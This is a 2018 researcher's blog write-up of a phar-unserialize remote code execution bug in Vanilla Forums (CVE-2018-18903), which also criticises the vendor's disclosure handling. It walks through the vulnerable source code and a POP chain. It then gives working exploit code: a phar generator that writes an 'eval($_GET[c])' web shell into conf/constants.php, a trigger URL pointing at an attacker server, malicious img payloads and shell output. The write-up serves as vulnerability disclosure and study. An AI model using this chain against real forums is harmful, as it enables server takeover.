---
layout: post
title: "Old School Pwning with New School Tricks :: Vanilla Forums domGetImages getimagesize Unserialize Remote Code Execution Vulnerability"
date: 2018-10-02 10:00:00 -0500
categories: blog
excerpt_separator: <!--more-->
---

<img class="excel" alt="Vanilla Forums" src="/assets/images/vanilla-forums.png">
<p class="cn" markdown="1">Since I have been working on bug bounties for a while, I decided to finally take the dive into some vendor specific bounties recently. Some of these are on [HackerOne](https://hackerone.com/vanilla) and for me, this is a huge leap of faith because I am a bit of an old schooler in that I remember a time when security researchers couldn't trust vendors, especially for judging impact and providing actionable information for their users to patch. After *my* experiance with [Vanilla](https://vanillaforums.com/), sadly, my stance is still the same. You simply cannot trust a vendor to provide actionable and accurate information.</p>
<!--more-->

<p class="cn">TL;DR</p>

<p class="cn" markdown="1">I walk through the discovery and exploitation of [CVE-2018-18903](/advisories/src-2018-0030) which is an unauthenticated unserialize vulnerability that can be leveraged for remote code execution. Vanilla provided no CVE and stated this report was resolved without providing a commit hash. Later on, I found out that their [changelog](https://open.vanillaforums.com/discussion/36771/security-update-vanilla-2-6-4) incorrectly states the impact of the vulnerability, provides users absolutely no risk rating and does not credit researchers. Shame!</p>

{% include image.html
            img="assets/images/poor-vanilla-advisory.png#2"
            title="A poor advisory by Vanilla"
            caption="A poor advisory by Vanilla"
            style="width:80%;height:80%" %}

### Introduction

<p class="cn" markdown="1">Vanilla forums is available via their git [repo](https://github.com/vanilla/vanilla) so I simply git cloned it and did a `composer install` whilst on the latest Ubuntu server at the time. Vanilla's [about page](https://vanillaforums.com/en/about-us/) is interesting</p>

> ...With so many sites competing for attention, a successful community must be engaging and reward member participation. Vanilla provides a modern community platform to organizations who want to improve customer service, increase advocacy, and strengthen brand loyalty...

<p class="cn" markdown="1">Let's talk about customer service...</p>

### Discovering the Vulnerability

<p class="cn" markdown="1">After a few days of auditing the source code, I found an interesting function in the `DashboardController` controller in `library/core/functions.general.php` file that was reachable by unauthenticated attackers:</p>

```php
class ImportController extends DashboardController {

    ...

    function fetchPageInfo($url, $timeout = 3, $sendCookies = false, $includeMedia = false) {      // 0
        $pageInfo = [
            'Url' => $url,
            'Title' => '',
            'Description' => '',
            'Images' => [],
            'Exception' => false
        ];

        try {

            ...

            $request = new ProxyRequest();
            $pageHtml = $request->request([
                'URL' => $url,
                'Timeout' => $timeout,
                'Cookies' => $sendCookies,
                'Redirects' => true,
            ]);                                                                                    // 1

            if (!$request->status()) {
                throw new Exception('Couldn\'t connect to host.', 400);
            }

            $dom = pQuery::parseStr($pageHtml);                                                    // 2
            if (!$dom) {
                throw new Exception('Failed to load page for parsing.');
            }

            ...

            // Page Images
            if (count($pageInfo['Images']) == 0) {
                $images = domGetImages($dom, $url);                                                // 3
                $pageInfo['Images'] = array_values($images);
            }
```

<p class="cn" markdown="1">At *[0]* we enter the function via a crafted GET request and then at *[1]* we can trigger an SSRF using an attacker controlled `$url` variable parsed into the `fetchPageInfo` function. This on its own is an interesting finding of course and I reported it to only be closed as a duplicate. But of course, that isn't patched.</p>

<p class="cn" markdown="1">Later at *[2]* the code parses the page response using the `pQuery` class into the `dom` variable.</p>

<p class="cn" markdown="1">Finally, in this function at *[3]* the code calls the `domGetImages` function with our `$url` and `$dom` which is a 2d array containing the response from our web server. Continuing inside of the `library/core/functions.general.php` file we can see the following code:</p>

```php
    function domGetImages($dom, $url, $maxImages = 4) {
        $images = [];
        foreach ($dom->query('img') as $element) {                                      // 4
            $images[] = [
                'Src' => absoluteSource($element->attr('src'), $url),                   // 5
                'Width' => $element->attr('width'),
                'Height' => $element->attr('height'),
            ];
        }

        ...
```

<p class="cn" markdown="1">At *[4]* the code looks for a html `<img>` tag within the `dom` variable and at *[5]* it will set the `$images` 2d array with the attackers controlled src attribute by calling the `absoluteSource` function. Let's check that function for clarification:</p>

```php
   function absoluteSource($srcPath, $url) {
        // If there is a scheme in the srcpath already, just return it.
        if (!is_null(parse_url($srcPath, PHP_URL_SCHEME))) {                    // 6
            return $srcPath;                                                    // 7
        }

    ...

    }
```

<p class="cn" markdown="1">At *[6]* the code parses the attacker controlled `srcPath` using `parse_url` (oh hai [@orange_8361](https://twitter.com/orange_8361)) and then at *[7]* the code returns the `$srcPath` if the scheme isn't empty. Now back in the `domGetImages` function, we see:</p>

```php
    function domGetImages($dom, $url, $maxImages = 4) {

        ...

        // Sort by size, biggest one first
        $imageSort = [];
        // Only look at first 4 images (speed!)
        $i = 0;
        foreach ($images as $imageInfo) {
            $image = $imageInfo['Src'];                                                 // 8

            if (strpos($image, 'doubleclick.') != false) {
                continue;
            }

            try {
                if ($imageInfo['Height'] && $imageInfo['Width']) {
                    $height = $imageInfo['Height'];
                    $width = $imageInfo['Width'];
                } else {
                    list($width, $height) = getimagesize($image);                       // 9
                }
```

<p class="cn" markdown="1">A loop is happening over all the possible images and at *[8]* the code is extracting the src value from the 2d array and setting the `image` variable. Finally at *[9]* if no height or width properties are set in the `<img>` tag, then the code will attempt a `getimagesize` on the fully controlled path.</p>

<p class="cn" markdown="1">This can result in remote code execution.</p>

### Exploitation

<p class="cn" markdown="1">Some time ago, long before a [blackhat](https://raw.githubusercontent.com/s-n-t/presentations/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf) paper was written by [Sam Thomas](https://twitter.com/@_s_n_t), [@orange_8361](https://twitter.com/orange_8361) [shared](https://rdot.org/forum/showthread.php?t=4379) a technique for triggering an unserialize within a phar archive.</p>

<p class="cn" markdown="1">I am not going to deep dive into phar or how the technique works because its been explained well by [others](https://blog.ripstech.com/2018/new-php-exploitation-technique/). But essentially, we can set the metadata of a phar archive with an non-instantiated class.</p>

```php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');

// add object of any class as meta data
class AnyClass {}
$object = new AnyClass;
$object->data = 'rips';
$phar->setMetadata($object);
$phar->stopBuffering();
```

<p class="cn" markdown="1">With this newly created file, we can trigger a `__destruct` call with *any* file operation as long as we can control the complete string.</p>

```php
class AnyClass {
    function __destruct() {
        echo $this->data;
    }
}
// output: rips
include('phar://test.phar');
```

<p class="cn" markdown="1">What this means is that if we can do `getimagesize('phar://some/phar.ext');` then we can trigger a `__destruct` call that can do something unexpected...</p>

<p class="cn" markdown="1">However. At this point we have a couple of hurdles to overcome:</p>

<div markdown="1" class="cn">
1. *Phar planting*: We need to plant a phar archive onto our target system.
2. *POP chain*: We need to find a php pop chain that we can leverage for nothing less than remote code execution.
</div>

#### Phar planting

<p class="cn" markdown="1">Sam states that there are several ways to do this such as using a [race condition](https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf) with `phpinfo` in which you can leak the temporary file that is uploaded or using `/proc/self/fd`. However these techniques don't work because there is a check for a file extension. The techniques that I tested and proved working (at least in this specific case) are:</p>

<div markdown="1" class="cn">
* If targeting a Windows system, just use a remote share! `phar:////attacker/share/test.phar/.jpg`.
* If you are targeting unix, you can also leverage a file upload bug where they do not check the contents of the file. You will also need to leak the file path.
</div>

<p class="cn" markdown="1">For my proof of concept, I just went with a file upload and leaked the file path to plant a phar archive on the target system. The filename is generated with `md_rand`, which is an information disclosure bug in itself, but whatever!</p>

#### POP chain

<p class="cn" markdown="1">I had a few choices but the class I decided to leverage in the end was the `Gdn_Configuration` class in `library/core/class.configuration.php`.</p>

```php
class Gdn_Configuration extends Gdn_Pluggable {

    ...

    public function shutdown() {
        foreach ($this->sources as $source) {       // 2
            $source->shutdown();                    // 3
        }
    }
    
    ...

    public function __destruct() {
        if ($this->autoSave) {                      // 0
            $this->shutdown();                      // 1
        }
    }
}
```
<p class="cn" markdown="1">At *[0]* and *[1]* we can reach the `shutdown` function if we set the `autoSave` property. Then at *[2]* and *[3]* we can reach the shutdown of another class that we specify. I decided to leverage a class that contains that function and not the magic method `__call`.</p>

<p class="cn" markdown="1">In `library/core/class.configurationsource.php` we can see the following code</p>

```php
class Gdn_ConfigurationSource extends Gdn_Pluggable {

    ...

    /**
     * Save the config.
     *
     * @return bool|null Returns **null** of the config doesn't need to be saved or a bool indicating success.
     * @throws Exception Throws an exception if something goes wrong while saving.
     */
    public function save() {
        if (!$this->Dirty) {
            return null;
        }

        ...

        switch ($this->Type) {                                                                       // 6
            case 'file':
                if (empty($this->Source)) {
                    trigger_error(errorMessage('You must specify a file path to be saved.', 'Configuration', 'Save'), E_USER_ERROR);
                }
                $checkWrite = $this->Source;
                if (!file_exists($checkWrite)) {
                    $checkWrite = dirname($checkWrite);
                }
                if (!is_writable($checkWrite)) {
                    throw new Exception(sprintf(t("Unable to write to config file '%s' when saving."), $this->Source));
                }
                $group = $this->Group;                                                               // 7
                $data = &$this->Settings;

                ...

                $options = [
                    'VariableName' => $group,                                                       // 8
                    'WrapPHP' => true,
                    'ByLine' => true
                ];
                if ($this->Configuration) {
                    $options = array_merge($options, $this->Configuration->getFormatOptions());
                }
                // Write config data to string format, ready for saving
                $fileContents = Gdn_Configuration::format($data, $options);                         // 9
                if ($fileContents === false) {
                    trigger_error(errorMessage('Failed to define configuration file contents.', 'Configuration', 'Save'), E_USER_ERROR);
                }
                // Save to cache if we're into that sort of thing
                $fileKey = sprintf(Gdn_Configuration::CONFIG_FILE_CACHE_KEY, $this->Source);
                if ($this->Configuration && $this->Configuration->caching() && Gdn::cache()->type() == Gdn_Cache::CACHE_TYPE_MEMORY && Gdn::cache()->activeEnabled()) {
                    $cachedConfigData = Gdn::cache()->store($fileKey, $data, [
                        Gdn_Cache::FEATURE_NOPREFIX => true,
                        Gdn_Cache::FEATURE_EXPIRY => 3600
                    ]);
                }
                $tmpFile = tempnam(PATH_CONF, 'config');
                $result = false;
                if (file_put_contents($tmpFile, $fileContents) !== false) {                        // 14
                    chmod($tmpFile, 0775);
                    $result = rename($tmpFile, $this->Source);                                     // 15
                }

                ...

                $this->Dirty = false;
                return $result;
                break;
        ...

    }

    ...

    public function shutdown() {
        if ($this->Dirty) {                     // 4
            $this->save();                      // 5
        }
    }
}
```

<p class="cn" markdown="1">This code is a lot to chew, so bare with me. At *[4]* and *[5]* we can reach the `save` function. Then at *[6]*, we can reach into the 'file' switch block if our `Type` property is set correctly. At *[7]* we can set the `group` variable using the `Group` property. At *[8]* the `group` variable us used in a 2d array within the `options` variable. Now the interesting code is at *[9]* which calls the `Gdn_Configuration::format` function using `options` and `data`, both of which we can control via properties.</p>

<p class="cn" markdown="1">Ok, let's take a deep breath now and check out the `format` function in the `Gdn_Configuration` class:</p>

```php
class Gdn_Configuration extends Gdn_Pluggable {

    ...

    public static function format($data, $options = []) {
        if (is_string($options)) {
            $options = ['VariableName' => $options];
        }
        $defaults = [
            'VariableName' => 'Configuration',
            'WrapPHP' => true,
            'SafePHP' => true,
            'Headings' => true,
            'ByLine' => true,
            'FormatStyle' => 'Array'
        ];
        $options = array_merge($defaults, $options);
        $variableName = val('VariableName', $options);                                  // 10
        $wrapPHP = val('WrapPHP', $options, true);
        $safePHP = val('SafePHP', $options, true);
        $byLine = val('ByLine', $options, false);
        $headings = val('Headings', $options, true);
        $formatStyle = val('FormatStyle', $options);
        $formatter = "Format{$formatStyle}Assignment";
        $firstLine = '';
        $lines = [];
        if ($wrapPHP) {
            $firstLine .= "<?php ";
        }
        if ($safePHP) {
            $firstLine .= "if (!defined('APPLICATION')) exit();";                       // 11
        }
        if (!empty($firstLine)) {
            $lines[] = $firstLine;
        }
        if (!is_array($data)) {
            return $lines[0];
        }
        $lastKey = false;
        foreach ($data as $key => $value) {
            if ($headings && $lastKey != $key && is_array($value)) {
                $lines[] = '';
                self::formatComment($key, $lines);
                $lastKey = $key;
            }
            if ($formatStyle == 'Array') {
                $prefix = '$'.$variableName."[".var_export($key, true)."]";             // 12
            }
            if ($formatStyle == 'Dotted') {
                $prefix = '$'.$variableName."['".trim(var_export($key, true), "'");     // 13
            }
            $formatter($lines, $prefix, $value);
        }
        if ($byLine) {
            $session = Gdn::session();
            $user = $session->UserID > 0 && is_object($session->User) ? $session->User->Name : 'Unknown';
            $lines[] = '';
            self::formatComment('Last edited by '.$user.' ('.remoteIp().') '.Gdn_Format::toDateTime(), $lines);
        }
        $result = implode(PHP_EOL, $lines);
        return $result;
    }

    ...
}
```

<p class="cn" markdown="1">At *[10]* we can control the `variableName` since it comes from our `Group` property. Then at *[11]* there is a PHP show stopper. This show stopper will become relevant in just a bit, and I will show you how to bypass it. Also, we can see that at *[12]* and *[13]* that we can influence/control the PHP code being generated and essentially what this function is doing is dynamically building the PHP configuration file using our controlled properties!</p>

<p class="cn" markdown="1">Back to the `save` function, we can see at *[14]* that the contents are written to a temporary file. Then, finally at *[15]* the code renames the temporary file to the filename we can control via the `Source` property. That code one more time:</p>

```php
                if (file_put_contents($tmpFile, $fileContents) !== false) {       // 14
                    chmod($tmpFile, 0775);
                    $result = rename($tmpFile, $this->Source);                    // 15
                }
```

<p class="cn" markdown="1">With a well-designed payload, we can create a file with the following contents:</p>

```php
<?php if (!defined('APPLICATION')) exit();
$a=eval($_GET[c]);//[''] = '';

// Last edited by Unknown (172.16.175.1)2018-09-16 00:59:01
```

<p class="cn" markdown="1">Now even though there is a show stopper, we can simply overwrite the `conf/config.php` file since the file is supposed to be writable anyway (due to configuration changes by the admin)! However for my final exploit, I wanted to make sure I don't damage the application so I choose to overwrite the `conf/constants.php` file instead and re-write the constants back in, making exploitation pretty silent. This is ok because the `conf` directory is supposed to be writable anyway.</p>

<p class="cn" markdown="1">Another reason why I leveraged these files is because they are included at runtime, so we bypass the PHP show stopper!</p>

<p class="cn" markdown="1">Now if you have made it down this far, then you deserve some exploit code! Please note that since we are in a `__destruct` call, php has no cwd so we can't just use a relative path to the `constants.php` file. You may need to leak the path (which is achievable).</p>

```php

// custom pop chain
class Gdn_ConfigurationSource{
    public function __construct(){
        $this->Type = "file";
        $this->Source = "/var/www/html/conf/constants.php";
        $this->Group = 'a=eval($_GET[c]);//';
        $this->Settings[""] = "";       
        $this->Dirty = true;
        $this->ClassName = "Gdn_ConfigurationSource";
    }
}
class Gdn_Configuration {
    public $sources = [];
    public function __construct(){
        $this->sources['si'] = new Gdn_ConfigurationSource();
    }
}

// create new Phar
$phar = new Phar('poc.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

// add our object as meta data
$phar->setMetadata(new Gdn_Configuration());
$phar->stopBuffering();

// we rename it now
rename("poc.phar", "poc.jpg");
```

<p class="cn" markdown="1">Now, to trigger the bug, we just need to do:</p>

`http://target/index.php?p=/dashboard/utility/fetchPageInfo/http:%2f%2f[attacker-web-server]:9090%2f`

<p class="cn" markdown="1">The URL encoding is important for exploitation. Now the attackers web server responds with:</p>

```html
<html><body><img src="phar:///var/www/html/uploads/6O51ZT69P0S4.jpg">a</img></body></html>
```

<p class="cn" markdown="1">Or, if you exploiting this vulnerability on Windows, you can do:</p>

```html
<html><body><img src="phar:////attacker/share/test.phar">a</img></body></html>
```

<p class="cn" markdown="1">The exploit I sent to Vanilla uses their own code to upload the image and leak the filename, which was an admin level authenticated feature. But it certainly doesn't mean that this bug is authenticated! Here is the output of my exploit.</p>

```txt
saturn:~ mr_me$ ./poc.py 172.16.175.143 admin:admin123 172.16.175.1
(+) targeting: http://172.16.175.143
(+) logged in!
(+) uploaded phar!
(+) leaked phar name 6O51ZT69P0S4.jpg!
(+) starting http server...
(!) triggered callback for phar!
(+) triggered a write!
(+) shell at: http://172.16.175.143/?c=phpinfo();

saturn:~ mr_me$ curl -sSG "http://172.16.175.143/?c=system('id');"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### The patch

<p class="cn" markdown="1">The [patch](https://github.com/vanilla/vanilla/commit/7e931112fb31da12e1566f6aa82c3f57cd3e8bcc) is interesting because the developer has also included their test cases against the vulnerable function. So maybe someone can develop their own test cases and bypass the patch!</p> 

```php
        $r = [
            'root' => ['/foo', 'http://ex.com/bar', 'http://ex.com/foo'],
            'relative' => ['bar', 'http://ex.com/foo', 'http://ex.com/foo/bar'],
            'relative slash' => ['bar', 'http://ex.com/foo/', 'http://ex.com/foo/bar'],
            'scheme' => ['https://ex.com', 'http://ex.com', 'https://ex.com'],
            'schema-less' => ['//ex.com', 'https://baz.com', 'https://ex.com'],
            'bad scheme' => ['bad://ex.com', 'http://ex.com', ''],
            'bad scheme 2' => ['foo', 'bad://ex.com', ''],
            '..' => ['../foo', 'http://ex.com/bar/baz', 'http://ex.com/bar/foo'],
            '.. 2' => ['../foo', 'http://ex.com/bar/baz/', 'http://ex.com/bar/foo'],
            '../..' => ['../../foo', 'http://ex.com/bar/baz', 'http://ex.com/foo'],
        ];
```

<p class="cn" markdown="1">Also, I might add that the comment message is nice:</p>

{% include image.html
            img="assets/images/commit-message-vanilla.png"
            title="No mention of security fixes in the commit message"
            caption="No mention of security fixes in the commit message"
            style="width:80%;height:80%" %}

<p class="cn" markdown="1">This certainly doesn't describe what the real issue is now does it?</p>

### Conclusion

<p class="cn" markdown="1">Over the years I have learnt that it's pretty important to stay independent when reporting vulnerabilities. There are sometimes cases such as these when the vendor either obscures, hides or plain right lies about the details and this type of behavior typically happens on bug bounty platforms where the vendors are favored.</p>

<p class="cn" markdown="1">Please note though, I clearly distinguish between product oriented and service oriented bug bounties. There is no way that users of a website or service need to be notified of technical details related to security issues as the code is not impacting them directly. They should only ever be notified if a breach has taken place and their IP has been released to third parties inadvertently as a result of that breach.</p>

### References

<div markdown="1" class="cn">
- [https://raw.githubusercontent.com/s-n-t/presentations/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf](https://raw.githubusercontent.com/s-n-t/presentations/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
- [https://blog.ripstech.com/2018/new-php-exploitation-technique/](https://blog.ripstech.com/2018/new-php-exploitation-technique/)
- [https://rdot.org/forum/showthread.php?t=4379](https://rdot.org/forum/showthread.php?t=4379)
</div>